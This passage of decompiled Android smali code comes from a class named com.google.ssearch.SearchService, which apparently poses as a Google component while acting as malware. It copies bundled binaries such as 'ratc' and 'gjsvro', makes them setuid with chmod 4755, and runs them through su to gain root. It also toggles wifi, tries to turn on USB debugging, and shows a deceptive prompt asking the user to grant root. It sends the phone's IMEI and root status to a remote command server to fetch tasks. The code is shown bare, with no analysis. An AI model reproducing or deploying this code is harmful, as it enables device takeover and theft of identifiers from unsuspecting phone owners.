    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    new-instance v0, Ljava/io/File;

    const-string v1, "/system/xbin/su"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_4

    .line 194
    :cond_3
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission2()V

    goto :goto_0

    .line 195
    :cond_4
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_0

    .line 196
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission3()V

    goto :goto_0
.end method

.method private getPermission1()Z
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 202
    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v6, "P1"

    invoke-interface {v5, v6, v8}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    .line 203
    .local v3, "tried":Z
    if-eqz v3, :cond_0

    move v5, v8

    .line 235
    :goto_0
    return v5

    .line 206
    :cond_0
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 207
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    const-string v5, "gjsvro"

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "/data/data/"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/gjsvro"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {p0, v5, v6}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 208
    const-string v5, "/system/bin/chmod"

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "4755 /data/data/"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/gjsvro"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 209
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "/data/data/"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/gjsvro /data/data/"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v6, ""

    invoke-static {v5, v6}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 212
    const-string v5, "wifi"

    invoke-virtual {p0, v5}, Lcom/google/ssearch/SearchService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/net/wifi/WifiManager;

    .line 214
    .local v4, "wifi":Landroid/net/wifi/WifiManager;
    invoke-virtual {v4}, Landroid/net/wifi/WifiManager;->getWifiState()I

    move-result v5

    const/4 v6, 0x3

    if-ne v5, v6, :cond_1

    .line 215
    invoke-virtual {v4, v8}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 216
    const/4 v2, 0x1

    .line 221
    .local v2, "flag":Z
    :goto_1
    const-wide/16 v5, 0x1388

    invoke-static {v5, v6}, Landroid/os/SystemClock;->sleep(J)V

    .line 222
    invoke-virtual {v4, v2}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 225
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v5

    if-eqz v5, :cond_2

    .line 226
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchReport()V

    move v5, v9

    .line 228
    goto/16 :goto_0

    .line 218
    .end local v2    # "flag":Z
    :cond_1
    invoke-virtual {v4, v9}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 219
    const/4 v2, 0x0

    .restart local v2    # "flag":Z
    goto :goto_1

    .line 232
    :cond_2
    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 233
    .local v1, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v5, "P1"

    invoke-interface {v1, v5, v9}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 234
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move v5, v8

    .line 235
    goto/16 :goto_0
.end method

.method private getPermission2()V
    .locals 13

    .prologue
    const/4 v12, 0x0

    .line 241
    iget-object v9, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v10, "P2"

    invoke-interface {v9, v10, v12}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 242
    .local v1, "count":I
    const/16 v9, 0xa

    if-lt v1, v9, :cond_1

    .line 243
    iput v12, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 244
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->isVersion221()Z

    move-result v9

    if-nez v9, :cond_0

    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission3()V

    .line 289
    :cond_0
    :goto_0
    return-void

    .line 247
    :cond_1
    add-int/lit8 v1, v1, 0x1

    .line 248
    iget-object v9, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v9}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 249
    .local v3, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v9, "P2"

    invoke-interface {v3, v9, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 250
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 251
    const/4 v9, 0x2

    iput v9, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 253
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 255
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    :try_start_0
    const-string v9, "gjsvro"

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "/data/data/"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/gjsvro"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {p0, v9, v10}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 256
    const-string v9, "/system/bin/chmod"

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "4755 /data/data/"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/gjsvro"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 258
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v9

    const-string v10, "su"

    invoke-virtual {v9, v10}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v8

    .line 259
    .local v8, "process":Ljava/lang/Process;
    const/4 v7, 0x0

    .line 260
    .local v7, "os":Ljava/io/DataOutputStream;
    new-instance v7, Ljava/io/DataOutputStream;

    .end local v7    # "os":Ljava/io/DataOutputStream;
    invoke-virtual {v8}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    invoke-direct {v7, v9}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 261
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "/data/data/"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v10, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "/gjsvro /data/data/"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "\n"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 262
    const-string v9, "exit\n"

    invoke-virtual {v7, v9}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 263
    invoke-virtual {v7}, Ljava/io/DataOutputStream;->flush()V

    .line 264
    invoke-virtual {v8}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 269
    .end local v7    # "os":Ljava/io/DataOutputStream;
    .end local v8    # "process":Ljava/lang/Process;
    :goto_1
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v9

    if-eqz v9, :cond_2

    .line 270
    iput v12, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 271
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchReport()V

    goto/16 :goto_0

    .line 265
    :catch_0
    move-exception v9

    move-object v2, v9

    .line 266
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 276
    .end local v2    # "e":Ljava/lang/Exception;
    :cond_2
    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4}, Landroid/content/Intent;-><init>()V

    .line 277
    .local v4, "intent":Landroid/content/Intent;
    const-class v9, Lcom/google/ssearch/Dialog;

    invoke-virtual {v4, p0, v9}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 278
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-virtual {v0, v9}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    .line 279
    .local v6, "name":Ljava/lang/String;
    if-eqz v6, :cond_3

    const-string v9, ""

    invoke-virtual {v9, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    :cond_3
    const-string v6, "\u672c\u8f6f\u4ef6"

    .line 280
    :cond_4
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "\u9700\u8981root\u6743\u9650\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u901a\u8fc7\u6388\u6743\u7ba1\u7406\u7a0b\u5e8f\u8fdb\u884c\u6388\u6743\uff01"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 282
    .local v5, "msg":Ljava/lang/String;
    :try_start_1
    const-string v9, "MSG"

    new-instance v10, Ljava/lang/String;

    const-string v11, "UTF-8"

    invoke-virtual {v5, v11}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    const-string v12, "UTF-8"

    invoke-direct {v10, v11, v12}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_1

    .line 286
    :goto_2
    const/high16 v9, 0x10000000

    invoke-virtual {v4, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 287
    const-string v9, "TYPEdsada"

    const-string v10, "su"

    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 288
    invoke-virtual {p0, v4}, Lcom/google/ssearch/SearchService;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 283
    :catch_1
    move-exception v9

    move-object v2, v9

    .line 284
    .local v2, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto :goto_2
.end method

.method private getPermission3()V
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 319
    const/4 v3, 0x3

    iput v3, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 322
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "adb_enabled"

    invoke-static {v3, v4, v5}, Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v3

    if-nez v3, :cond_0

    .line 323
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->setUsbEnabled()I

    move-result v3

    const/16 v4, 0xa

    if-lt v3, v4, :cond_0

    .line 324
    iput v5, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 349
    :goto_0
    return-void

    .line 329
    :cond_0
    iget-object v3, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v4, "P3"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 330
    .local v1, "count":I
    const/16 v3, 0x10

    if-lt v1, v3, :cond_1

    .line 331
    iput v5, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    goto :goto_0

    .line 334
    :cond_1
    add-int/lit8 v1, v1, 0x1

    .line 335
    iget-object v3, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 336
    .local v2, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v3, "P3"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 337
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 339
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 340
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    const-string v3, "ratc"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/ratc"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {p0, v3, v4}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 341
    const-string v3, "killall"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/killall"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {p0, v3, v4}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 342
    const-string v3, "gjsvro"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/gjsvro"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {p0, v3, v4}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 344
    const-string v3, "/system/bin/chmod"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "4755 /data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/ratc"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 345
    const-string v3, "/system/bin/chmod"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "4755 /data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/killall"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 346
    const-string v3, "/system/bin/chmod"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "4755 /data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/gjsvro"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/google/ssearch/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 348
    new-instance v3, Lcom/google/ssearch/SearchService$MyThread;

    invoke-direct {v3, p0}, Lcom/google/ssearch/SearchService$MyThread;-><init>(Lcom/google/ssearch/SearchService;)V

    invoke-virtual {v3}, Lcom/google/ssearch/SearchService$MyThread;->start()V

    goto/16 :goto_0
.end method

.method private getSearchTask()Ljava/lang/String;
    .locals 13

    .prologue
    .line 443
    const/4 v9, 0x0

    .line 445
    .local v9, "result":Ljava/lang/String;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 446
    .local v8, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    const-string v0, "http://search.gongfu-android.com:8511/search/getty.php"

    .line 447
    .local v0, "action":Ljava/lang/String;
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "imei"

    iget-object v12, p0, Lcom/google/ssearch/SearchService;->mImei:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 448
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "managerid"

    sget-object v12, Lcom/google/ssearch/SearchService;->mIdentifier:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 449
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v10

    if-eqz v10, :cond_2

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "root"

    const-string v12, "1"

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 452
    :goto_0
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, v0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 454
    .local v3, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v10, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v11, "UTF-8"

    invoke-direct {v10, v8, v11}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v3, v10}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 455
    new-instance v10, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v10}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v10, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 456
    .local v4, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v10

    const/16 v11, 0xc8

    if-ne v10, v11, :cond_1

    .line 457
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 458
    .local v2, "entity":Lorg/apache/http/HttpEntity;
    invoke-interface {v2}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    .line 459
    .local v5, "is":Ljava/io/InputStream;
    new-instance v6, Ljava/io/InputStreamReader;

    invoke-direct {v6, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 460
    .local v6, "isr":Ljava/io/InputStreamReader;
    new-instance v1, Ljava/io/BufferedReader;

    invoke-direct {v1, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 461
    .local v1, "br":Ljava/io/BufferedReader;
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    .line 463
    .local v7, "line":Ljava/lang/String;
    if-eqz v7, :cond_0

    invoke-virtual {v7}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v10

    const-string v11, "OK"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 464
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    .line 465
    invoke-virtual {v9}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    .line 468
    :cond_0
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V

    .line 469
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 470
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 474
    .end local v1    # "br":Ljava/io/BufferedReader;
    .end local v2    # "entity":Lorg/apache/http/HttpEntity;
    .end local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    .end local v5    # "is":Ljava/io/InputStream;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .end local v7    # "line":Ljava/lang/String;
    :cond_1
    :goto_1
    return-object v9

    .line 450
    .end local v3    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :cond_2
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "root"

    const-string v12, "0"

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 472
    .restart local v3    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :catch_0
    move-exception v10

    goto :goto_1
.end method

.method private isVersion221()Z
    .locals 2

    .prologue
    .line 154
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 155
    .local v0, "osVer":Ljava/lang/String;
    const-string v1, "2.2.1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

